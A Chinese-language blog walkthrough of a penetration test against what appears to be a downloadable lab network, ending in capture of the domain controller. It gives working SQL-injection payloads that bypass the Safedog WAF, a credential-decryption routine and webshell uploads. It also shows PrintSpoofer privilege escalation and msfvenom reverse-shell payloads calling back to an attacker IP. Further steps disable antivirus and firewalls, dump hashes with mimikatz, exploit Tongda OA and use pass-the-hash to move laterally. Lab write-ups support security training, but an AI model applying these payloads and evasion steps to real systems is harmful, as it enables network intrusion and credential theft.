# 原创
：  渗透测试之常规外网打点拿下域控

# 渗透测试之常规外网打点拿下域控

**目录**

[一、网络示意图](#%E4%B8%80%E3%80%81%E7%BD%91%E7%BB%9C%E7%A4%BA%E6%84%8F%E5%9B%BE)

[二、信息收集 ](#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%C2%A0)

[2.0 netdiscover存活探测](#h3-2-0-netdiscover-)

[2.1 端口扫描 ](#2.1%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%C2%A0)

[2.2 美化NMAP扫描结果 ](#2.2%20%E7%BE%8E%E5%8C%96NMAP%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%C2%A0)

[2.3 目录扫描编写一个绕防火墙脚本 ](#2.3%20%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99%E8%84%9A%E6%9C%AC%C2%A0)

[2.4 访问特殊状态码地址 ](#2.4%20%E8%AE%BF%E9%97%AE%E7%89%B9%E6%AE%8A%E7%8A%B6%E6%80%81%E7%A0%81%E5%9C%B0%E5%9D%80%C2%A0)

[三、对目标进行渗透测试](#%E4%B8%89%E3%80%81%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95)

[3.1测试Web服务器](#h3-4-1-web-)

[四、内网渗透](#h1--)

[4.1 对web 服务器的操作](#h3-5-1-web-)

[4.2 对OA服务器进行渗透](#h3-5-2-oa-)

[4.3 对域控主机进行渗透](#h3-5-3-)

[4.3.2 利用kiwi dcsync_ntml获取域管理员的ntml](#h3-5-3-2-kiwi-dcsync_ntml-ntml)

[4.4 使用CS渗透最后的域控](#h3-5-4-cs-)

[五、总结（有防护域控内网） ](#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93%EF%BC%88%E6%9C%89%E9%98%B2%E6%8A%A4%E5%9F%9F%E6%8E%A7%E5%86%85%E7%BD%91%EF%BC%89%C2%A0)

---


[免费获取网络安全资源](https://docs.qq.com/doc/DRHFnVWJjTU50ZVhG)

### 一、网络示意图

`此次最终目标是拿下有防护内网之中的DC机器`

### 二、信息收集 

#### 2.0 netdiscover存活探测

使用命令

> 
“ netdiscover -i eth0 -r 192.168.0.0/24 ”


#### 2.1 端口扫描 

`因为服务器上存在安全防护软件 尽量把 rate 的值调低 掉调大可能会被封 `

可以先用masscan 探测哪些端口开放，再用nmap 扫描开放端口具体信息

> 
masscan 192.168.0.114 -p 1-65535 --rate=100


> 
- `nmap -sV -p 3389,5985,6588,999,21,80 -A 192.168.0.114 -oA attack-ports`- `-sV是扫描系统版本和程序版本检测`- `-oA 是将结束输出到webhack文件中（会产生多个文件）`


#### 2.2 美化NMAP扫描结果 

> 
- `此时，扫描完毕。已经将结果保存到3个文件之中。但是观感不是太好。`- `开美化一下，使用到一个模型文件“ mode.xsl ”。`- `使用命令“ xsltproc -o attack.html mode.xsl attack-ports.xml ”`- `将扫描结果“ attack-ports.xml ”根据“ mode.xsl ”生成“ attack.html ”。`


`打开生成的文件，进行查看。另外可以根据自己需求来修改模型文件即可`

`发现80端口还有一些robots文件`

`打开访问试试`

找到一些敏感信息

#### 2.3 目录扫描编写一个绕防火墙脚本 

`使用常规目录扫描器会因为线程过大直接给ban掉`

`因为并发请求过多，会当作 cc 攻击拉黑处理。 一般被拉黑 就要等十分钟后再扫描`

**用py3写一个带有沉睡0.5S的小脚本** 

```
#conding:utf-8
import requests
import time
import sys
#加载字典文件
with open('big.txt','r',encoding='UTF-8') as readfile:
    for dirs in readfile.readlines():
        #生成对应url
        url ="http://www.moonlab.com/"+dirs.strip('\n')
        resp = requests.get(url)
        strlen=len(resp.text)
        #将扫描结果输出
        print(url+'---'+str(resp.status_code)+'---len---'+str(strlen))
        #沉睡0.5S
        time.sleep(0.5)
        #判断特殊状态码，将对应url保存到文件之中
        if resp.status_code ==200 or resp.status_code==403 or resp.status_code==301 or resp.status_code==500:
            with open('write.txt','a',encoding='UTF-8') as writefile:
                writefile.write(url+'---'+str(resp.status_code)+'---len---'+str(strlen)+'\n')
```

#### 2.4 访问特殊状态码地址 

`一遍让脚本跑这，一遍看看特殊状态码的url，命令`

> 
`“ cat write.txt | grep 500 ”`


使用火狐打开，[moonlab.com - ](http://www.moonlab.com/siteserver) 

 

### 三、对目标进行渗透测试

#### 3.1测试Web服务器

3.1.1 查找siteserver对应漏洞

`上边通过目录扫描，发现目标网站使用siteserver。去网上找找有没有现场的poc`

> 
- `在这里找到https://github.com/w-digital-scanner/w9scan/tree/master/plugins/siteserver。`


**将利用源代码复制下来，进行魔改，直接利用的话会被网站安全狗拦截。**

```
import requests
#定义payload到列表之中
ps=[
        'siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&amp;DateFrom=&amp;DateTo=&amp;IsSuccess=All',
        'usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--',
        'siteserver/bbs/background_keywordsFilting.aspx?grade=0&amp;categoryid=0&amp;keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271',
        'siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&amp;PageNum=0&amp;Keyword=test&amp;AreaID=0&amp;LastActivityDate=0&amp;Order=UserName',
        'siteserver/userRole/background_user.aspx?PageNum=0&amp;Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&amp;CreateDate=0&amp;LastActivityDate=0&amp;TypeID=0&amp;DepartmentID=0&amp;AreaID=0',
        'siteserver/bbs/background_thread.aspx?UserName=test&amp;Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&amp;DateFrom=&amp;DateTo=&amp;ForumID=0',
        ]
for p in ps:
    #构建测试payload
    url='http://www.moonlab.com/'+p
    res = requests.get(url)
    #判断是否存在漏洞并将对应测试url打印输出
    if res.status_code==500 and "GAOJIMicrosoft" in res.text:
        print(url)
        print(res.text)
```

使用poc进行测试

访问漏洞url，发现报错注入，爆出版本信息，是MSSql数据库

试试能不能爆出数据库名称，直接被狗拦截

<br/>`加“~”过防护，语句：`

```
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2Bdb_name()=~2;%20--
```

此时可以本地去下载siteserver搭建，看看数据库结构 

最终的绕狗语句，查询用户：

```
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20~1=(select%20top%201%20username%20from%20[bairong_Administrator]);%20--
```

`查询密文：`

```
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20~1=(select%20top%201%20password%20from%20[bairong_Administrator]);%20--
```

查询key：

```
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20~1=(select%20top%201%20PasswordSalt%20from%20[bairong_Administrator]);%20--
```

> 
- `账号 密文 key`- `admin 64Cic1ERUP9n2OzxuKl9Tw== LIywB/zHFDTuEA1LU53Opg==`


4.1.2 寻找加解密算法程序 

使用dnSpy 反编译得到加密文件，找到解密代码

```
public void DesDecrypt()
{
    byte[] rgbIV = new byte[]
{
18,
52,
86,
120,
144,
171,
205,
239
    };
    byte[] array = new byte[this.x3c811436980dcf17.Length];
    try
    {
byte[] bytes = Encoding.UTF8.GetBytes(this.x6d0b493f217f133b.Substring(0, 8));
DESCryptoServiceProvider descryptoServiceProvider = new
DESCryptoServiceProvider();
array = Convert.FromBase64String(this.x3c811436980dcf17);
MemoryStream memoryStream = new MemoryStream();
if (!false)
{
}
CryptoStream cryptoStream = new CryptoStream(memoryStream,
descryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
cryptoStream.Write(array, 0, array.Length);
cryptoStream.FlushFinalBlock();
Encoding encoding = new UTF8Encoding();
this.xc7d800b8a71773fd = encoding.GetString(memoryStream.ToArray());
    }
    catch (Exception ex)
    {
this.x456956327593d9f6 = ex.Message;
}
this.x456956327593d9f6
```

4.1.3 编写 c# siteserver 密文解密工具

拉个控件

拉四个文本框

拉个说明框 

在拉去一个button 

将刚刚的代码复制出来，加入到上边

导入（重构）这些所需库

将传入信息带入

`微微调整后，进程测试。得到密码：admin5566`

假如我们输出的信息不对的话

4.1.4 找回密码漏洞

`这是老版本的系统存在一个通杀漏洞。`

`输出账户，点击忘记密码数据包`

输出任意答案，将填入信息改为空放包即可 

直接看到明文密码 

其实，这里直接禁用JS也是可以直接进入后台的 

4.1.5 过狗上线菜刀

`这里后台拿shell也是比较容易。在这里上传压缩之后的一句马。`

因为存在狗，普通的一句话会被直接拦截掉 

所以上传过狗的一句话。上传成功 

使用菜刀连接，也是被狗拦截 

这个时候就要用到过狗刀了，并且因为上一次的操作导致一句马被干掉了，得再上传一个 

配合过狗刀，成功 

4.1.6 提权web服务器 

先看看权限，一个低权限得iis

主机名称，网络连接情况 

命令“ tasklist /svc ”查看一些进程信息 

看到一些安全狗得进程 

Systeminfo看到只打了2个补丁 

4.1.7 使用“ PrintSpoofer ”提权 

直接上传提权工具，路径为“ C:\Windows\Temp\ ”别的地方可能没有权限

但是一运行，发现就有问题，猜测是被杀软干掉了 

去靶机看看，果然被干掉了

免杀处理之后，再次上传搞定 

`执行命令： PrintSpoofer1.exe -i -c "whoami"`

 **这里已经是system为什么不创建用户加入管理员组的原因是：**

狗不会拦截创建用户，但是加入管理员组会被拦截，所以我们直接上传msf

4.1.8 MSF免杀上线 

`生成msf的payload，命令：`

> 
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=2333 -e x86/shikata_ga_nai -i 15 -f csharp -o payload.txt`


 

将全部的shellcode复制出来 

将生成的免杀文件上传到目标服务器 

Msf去开启监听 

菜刀直接木马

4.1.9 破解hash获得明文 

`这里老套路先迁移进程在获取hash与明文。但是迁移进程的时候，会话掉了`

看来不是太稳定，在获取一次 

一会又掉了，刷新文件发现木马文件直接被干掉了

`修改编译次数，重新生成免杀。终于获得到hash。`

> 
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=2333 -e x86/shikata_ga_nai -i 14 -f csharp -o payload.txt`


我们可以将获取到的hash到在线网站去破解一下

**`为什么是破解而不是直接导出明文账户密码呢？`**

`因为在win ser2012之后都默认不能导出。`

`一般是通过修改注册列表，重启之后等管理员登录才可以抓到。`

`这里我们出了用在线网站破解。也可以使用hashcat来破解`

**hashcat -a 0 -m 1000 hash.txt rockyou.txt —force**

> 

- `-a 0 字典模式`- `-m 是类型`- `hash.txt 是 ntml`- `rockyou 是字典`


## 四、内网渗透

#### 4.1 对web 服务器的操作

<a title="4">4</a>.1.1 关闭服务器杀软防火墙

`此时我们已经知道目标的账户密码： Administrator !@#QWE123`

`在看看远程主机有没有开启3389端口。Netstat`

直接登录 

退掉后台安全访问软件

关闭实时防护，省的在影响接下来的操作 

4.1.2 内网主机发现 

`先看看能不能找到目标与一些内网主机交互的，看看目标是否存在于内网，`

`Ipconfig发现内网IP段`

然后，netstat看看有没有与10段的内网主机有交互的。也没有发现 

看看路由表信息，arp ,也没有找到一些10段内网信息

`那就直接使用for循环ping遍历内网信息吧。命令：`

> 
`“ for /l %i in (1,1,255) do @ ping 10.10.1.%i -w 1 -n 1 | find /i "ttl=" “` 


> 
`并没有发现我们的目标主机，使用msf带的arp模块吧。“ run arp_scanner -r 10.10.1.0/24“`


发现目标主机130 

4.1.3 代理nmap对内网oa主机探测端口

`此时，已经发现内网主机10.10.1.130。我们增加路由设置代理去扫扫目标`

`开启socks4代理`

增加路由

`设置本地代理文件配置命令`

> 
`“ vim /etc/proxychains.conf “`


使用nmap对目标探测，扫描的很慢 

这里给一些内网常见端口扫描

> 
“ proxychains nmap -sT -Pn 10.10.1.130 -p 80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984 ,6379,7001,7002,9200,9300 ,11211,27017,27018 ,50000,50070,50030,21,22,23,2601,3389 --open “ 


`这么多端口，仅仅发现80开放是很不正常的。明显是存在防火墙拦截。`

`我们代理火狐浏览器去访问一下80端口看看。发现是通达oa`

#### 4.2 对OA服务器进行渗透

4.2.1 通达OA 办公系统getshsell

`这里使用通达oa之前爆的一个文件上传加文件包含漏洞进行利用攻击，下载exp`

`要将一下源代码进行修改，因为自带的代码生成的shell一般都会被查杀。`

`这里直接使用蚁剑生成一些免杀的一句话`

将生成代码进行base64编码 

将编码生成代码替换

> 
- `使用“ proxychains python3 tongda\ exp.py -H http://10.10.1.130 -file-shell ”生成木马。`


 

`代理火狐浏览器成功访问，木马上传成功`

设置蚁剑代理后，连接 

连接成功 

4.2.2 对通达OA服务器进行信息收集 

此时有一个比较迷的问题，就是蚁剑执行命令没有回显

可以操作文件，没有命令回显，那就让命令执行结果写入文件中 

 

> 
`使用“ net start &gt;&gt; cmd.txt ”看看已经启动的服务。映入眼帘的360.`


> 
- `在使用“ tasklist &gt;&gt; cmd.txt ”，“netstat -ano &gt;&gt; cmd.txt”，“systeminfo &gt;&gt; cmd.txt”看看`


> 
使用命令“ ipconfig /all &gt; cmd.txt ”。 


 

常用命令：

> 
- `net start 看看已经启动的服务。 tasklist 查看计算机应用列表。`- `netstat -ano 查看网络连接信息。 Systeminfo 查看计算机信息。`- `ipconfig /all 查看网络信息。 whoami 查看当前权限。`


信息整理： 

> 
- `oa 服务器存在两个 IP `- `分别是 10.10.1.130 10.10.10.166 `- `防护软件 ：`- `内置系统防火墙 Windows Firewall 360 安全卫士 360 杀毒软件`


4.2.3 关闭OA服务器系统自带的防火墙 

> 
- `从上面看到，OA服务器的端口开放很多。`- `但是因为防火墙的原因，导致我们代理kali扫描的时候，仅仅可以扫到80端口。`- `此时，可以使用`- `“ NetSh Advfirewall set allprofiles state off ” `- `关闭 Windows Firewall。即关闭win自带防火墙。`


为什么要关闭防火墙？ 
1. `因为一会要，msf生成木马进行正向连接OA服务器。`1. `有防火墙拦截的话，是无法上线MSF的`
通过上边的信息收集，我们得知oa服务器是开启445端口的。正常代理nmap探测一下

关闭状态，我们使用命令“ NetSh Advfirewall set allprofiles state off ”来关闭防火墙 

再次对目标进行探测 

4.2.4 免杀360全家桶上线MSF 

`生成正向连接 shellcode。命令：`

> 

- `“ msfvenom -p windows/meterpreter/bind_tcp LPORT=6666 -e x86/shikata_ga_nai -i 15 -f csharp -o payload_bind.txt ”`


继续使用掩日免杀 

`这里生成的木马可能会被查看，也可能不会。`

`一般可以使用“ curl http://www.baidu.com ”命令，`

`来查看服务器是否出网，不出网的话，360全家桶也行很久都没有更新。`

`这里就直接将生成的木马上传`

先在oa服务器上执行 

然后MSF中进行配置设置 

运行，得到会话 

4.2.5 获取OA服务器的哈希明文 

`查看权限是system之后，就迁移进程抓取哈希先，`

`这个进程若是迁移到非system之中。`

`可能就会dump不出hash`

`加载mimikatz，使用`

`“ mimikatz_command -f sekurlsa::searchPasswords ”`

`或者“ msv ”抓取明文。`

**注意： **

`这里还不能直接使用`

`“ mimikatz_command -f sekurlsa::searchPasswords ”，`

`使用目标服务器存在360，加载猕猴桃之后，`

`使用此功能抓取密码会被直接拦截。`

`导致会话被干掉，这里还是使用“ msv ”`

4.2.6 收集整理分析内网域的信息

**（1）判断是不是在域中，可以使用“ net time /domian ”来查看。这种是存在域**

这种是不在域中 

**（2）或者使用ps查看进程，发现存在域管理员进程** 

**（3）定位域控，使用命令“ run post/windows/gather/enum_domain ”** 

**（4）定位域控的另一个小知识，有时候直接“ ping dc ”就好了。**

**（5）使用命令“run post/windows/gather/enum_logged_on_users”查看登录的用户** 

#### 4.3 对域控主机进行渗透

4.3.1 代理nmap扫描域控端口

`上边说到，我们使用ps查看进程的时候，发现域管理员在线。`

`我们可以直接迁移进程到其中。`

`之后使用“shell”来产生一个会话，这个会话就可以直接访问域控C盘。`

`注意此次迁移使用命令“ steal_token ”，非“ migrate ”。`

但是域管理员会话产生失败，自然也获取不到域控C盘信息

我们返回msf，切换回system权限把还是，命令“ rev2self ”

还是老老实实，加代理，扫端口把 

对常见端口进行扫描 

> 
`“proxychains nmap -sT -Pn 10.10.10.165 -p 80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,88,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389 --open”`


 

最终扫描到开放4个端口 

#### 4.3.2 利用kiwi dcsync_ntml获取域管理员的ntml

`看到开放445，我们可是先获取域管理员的hash与ntml，来尝试登录。`

`比如msf的这个模块“ exploit/windows/smb/psexec ”。或者直接使用pth。`

> 
**扩展之什么是pth：**

`PTH （pass-the-hash）`
`pass-the-hash在内网渗透中是一种很经典的攻击方式，`
`原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，`
`而不用提供明文密码。`


`注意的是使用命令“ steal_token ”切换至域管理员64位进程，system权限是不行的。`

`之后加载猕猴桃kiwi使用命令“ dcsync_ntlm administrator ”来抓取`

但是在抓取之后，直接就掉会话，估计是被拦截了

那这个先到此为止吧，接下来使用CS进行渗透测试 

#### 4.4 使用CS渗透最后的域控

4.4.1 py免杀木马让web服务器上线CS

通过菜刀上传，使用命令 PrintSpoofer1.exe -i -c "shell.exe" 成功上线

4.4.2上线OA服务器 

`先开启socks代理，注意的是，开放的代理服务器是cs服务器IP，端口为56542.`

新建一个监听器，因为不出网，所以要改一下监听器的类型

`生成payload的时候要选择Windows Executable(Stageless) `

`该木马是生成无阶段后门，适用于不出网情况下`

`还存在360，需要免杀，直接替换360的图标即可，`

`因为目标机器也不出网。出网就jj了。`

`通过蚁剑上传`

`执行上传的“ 4.exe ”`

`此时需要用CS主动连接木马，注意的是正常情况下需要先关闭防火墙，`

`此时上边关过了。`

`关闭防火墙命令“ NetSh Advfirewall set allprofiles state off ”，成功上线。`

4.4.3 抓取OA服务器上的明文哈希 

`直接抓到域管理员明文`

此时，先看看能不能访问域控的C盘，很正常的不行 

```
此时，我们在通过PTH获取凭证。
```

 

填写信息

看看beacon中已经攻击成功

再次访问域控C盘

4.4.4　拿下域控机器 

`此时我们已经可以访问到域控C盘， 这个时候直接PTH攻击。`

`当然，事先要建立一个SMB监听。`

`然后，一个命令“ jump psexec DC ”选择刚刚建立的smb监听，直接上线。`

4.4.5 第二种拿下域控的法子 

一个比较野的法子就是，直接代理本机，远程登录

输入在OA服务器上抓到的域管的明文登录 

`下边有一个常规的，可以访问域控的C盘文件，`

`将木马上传到域控上，配合计划任务拿下。`

`但是没成功，登录后发现原因`

**下面是测试未成功的步骤。。。。因为存在win自带杀软** 

切换到 C:/myoa/webroot/ispirit/interface/ 目录

将木马文件复制到域控C盘，命令“　shell copy 4.exe \\dc\C$\　” 

查看域控当前时间 

`创建计划任务，使域控23点17执行4.exe程序（因为AT被弃用了）。`

> 
`命令“ shell SCHTASKS /Create /TN jihua01 /TR C:\4.exe /SC ONCE /ST 23:17 ”`


 

查看时间，应该到了

### 五、总结（有防护域控内网） 

5.1 外网服务器

`信息收集发现目标cms，参考网上案例进入后台，压缩包传免杀一句马配合过狗刀上线。`

`免杀PrintSpoofer后提权到system，使用掩日免杀msf木马上线MSF。`

`迁移进程后获取哈希，没有明文。使用在线网站破解哈希得到明文。`

`远程登录后，关闭杀软与防火墙。使用for循环配合ping探测内网主机。`

`增加路由配置代理，使用nmap扫描发现的内网主机。`

5.2 内网OA服务器 

`发现仅仅开放80端口，猜测存在防火墙，访问发现是通达OA，使用漏洞exp直接拿下。`

`对OA服务器进行信息收集，顺便关闭其自带防火墙，不然无法上线MSF。`

`正向连接需要可以访问目标其他端口，使用掩日生成正向免杀MSF木马。`

`正向连接上线MSF，获取OA服务器的明文哈希，收集整理OA服务器及其内网信息`

5.3 内网域控

`在OA服务器增加路由，代理nmap扫描域控开放445端口。`

`因为OA服务器存在域管进程，准备迁移进程（steal_token）抓取哈希之后。`

`使用PTH直接拿下域控，但是没有抓取哈希失败`

`这里假如可以抓到哈希或者明文的话，也可以直接代理mstsc直接登录域控。`

5.4 使用CS渗透

`使用py免杀生成CS木马，通过菜刀配合PrintSpoofer让外网服务器上线CS。`

`============================`

`开启CS的代理，新建beacon tcp的监听器，生成无阶段后门木马，通过蚁剑上传并执行。`

`关闭目标防火墙（上边MSF已经关闭）因为该机器不出网，使用CS进行正向连接上线。`

`============================`

`抓到域管的明文哈希，新建smb监听，使用pth直接上线域控机器。`

`当然，都抓到明文了。直接代理mstsc直接远程登录也可以。`

`靶场地址：`

`链接: https://pan.baidu.com/s/1b-MQ7Y3_t7foMwXFjDzJKg 提取码: bxs2`

 [免费获取网络安全资源](https://docs.qq.com/doc/DRHFnVWJjTU50ZVhG)

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 
